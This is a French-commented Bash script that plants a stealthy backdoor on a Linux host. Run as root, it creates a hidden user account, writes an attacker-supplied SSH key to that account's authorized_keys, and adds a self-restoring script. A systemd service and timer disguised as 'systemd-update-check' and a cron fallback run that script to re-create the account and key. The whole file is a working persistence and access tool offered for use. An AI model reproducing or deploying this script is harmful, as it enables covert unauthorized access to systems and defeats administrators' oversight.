#!/bin/bash
# ---------------------------------------------------------------
# deploy.sh  —  Déploiement furtif et automatisé
# ---------------------------------------------------------------

set -e

usage() {
  echo "Usage: $0 [-k /chemin/cle.pub] [-u username]" >&2
  exit 1
}
read_key() {
  echo "[?] Collez votre clé publique puis Ctrl‑D :"
  KEY=$(</dev/stdin)
  if [[ -z "$KEY" ]]; then
    echo "[!] Clé vide !" >&2; exit 1
  fi
}

while getopts "k:u:h" opt; do
  case $opt in
    k) KEY_FILE=$OPTARG ;;
    u) USER_NAME=$OPTARG ;;
    h) usage ;;
    *) usage ;;
  esac
done
shift $((OPTIND-1))


: "${USER_NAME:=wirensystem}"
UID_VAL=899
GID_VAL=899
HOME_DIR="/etc/.cache/.libsys/.home_${USER_NAME}"
PERSIST_DIR="/usr/local/lib/.sysupdate"
SCRIPT_PERSIST="$PERSIST_DIR/.persist_${USER_NAME}"
SERVICE_FILE="/etc/systemd/system/systemd-update-check@.service"
TIMER_FILE="/etc/systemd/system/systemd-update-check.timer"

# --- récupérer la clé publique ---
if [[ -n "$KEY_FILE" ]]; then
  if [[ -f "$KEY_FILE" ]]; then
    KEY=$(cat "$KEY_FILE")
  else
    echo "[!] Key Not Found : $KEY_FILE" >&2; exit 1
  fi
else
  read_key
fi

if [[ $EUID -ne 0 ]]; then
  echo "[!] Exécuter en root" >&2; exit 1
fi

getent group "$USER_NAME" >/dev/null || groupadd -g "$GID_VAL" "$USER_NAME"
if ! id "$USER_NAME" >/dev/null 2>&1; then
  useradd -u "$UID_VAL" -g "$GID_VAL" -d "$HOME_DIR" -s /bin/bash "$USER_NAME"
fi
usermod -d "$HOME_DIR" -s /bin/bash "$USER_NAME"

mkdir -p "$HOME_DIR/.ssh"
echo "$KEY" > "$HOME_DIR/.ssh/authorized_keys"
chmod 700 "$HOME_DIR/.ssh"
chmod 600 "$HOME_DIR/.ssh/authorized_keys"
chown -R "$USER_NAME:$USER_NAME" "$HOME_DIR"

mkdir -p "$PERSIST_DIR"
cat > "$SCRIPT_PERSIST" <<EOF
#!/bin/bash
USER="$USER_NAME"
HOME_DIR="$HOME_DIR"
KEY="$KEY"

getent group "\$USER" >/dev/null || groupadd -g $GID_VAL "\$USER"
id "\$USER" >/dev/null 2>&1 || useradd -u $UID_VAL -g $GID_VAL -d "\$HOME_DIR" -s /bin/bash "\$USER"
usermod -d "\$HOME_DIR" -s /bin/bash "\$USER"
mkdir -p "\$HOME_DIR/.ssh"
echo "\$KEY" > "\$HOME_DIR/.ssh/authorized_keys"
chmod 700 "\$HOME_DIR/.ssh"
chmod 600 "\$HOME_DIR/.ssh/authorized_keys"
chown -R "\$USER:\$USER" "\$HOME_DIR"
rm -rf /home/\$USER 2>/dev/null
exit 0
EOF
chmod +x "$SCRIPT_PERSIST"

cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=System update check slot %i
After=multi-user.target

[Service]
Type=oneshot
ExecStart=$SCRIPT_PERSIST
RemainAfterExit=yes
EOF

cat > "$TIMER_FILE" <<EOF
[Unit]
Description=Periodic system update check (slot fw)

[Timer]
OnBootSec=5min
OnUnitInactiveSec=10min
Unit=systemd-update-check@fw.service

[Install]
WantedBy=timers.target
EOF

systemctl daemon-reload
systemctl enable systemd-update-check@fw.service
systemctl start  systemd-update-check@fw.service
systemctl enable --now systemd-update-check.timer

# --- cron fallback ---
(crontab -l 2>/dev/null; echo "*/30 * * * * $SCRIPT_PERSIST >/dev/null 2>&1") | crontab -

echo "[+] Persistance déployée pour l'utilisateur : $USER_NAME"
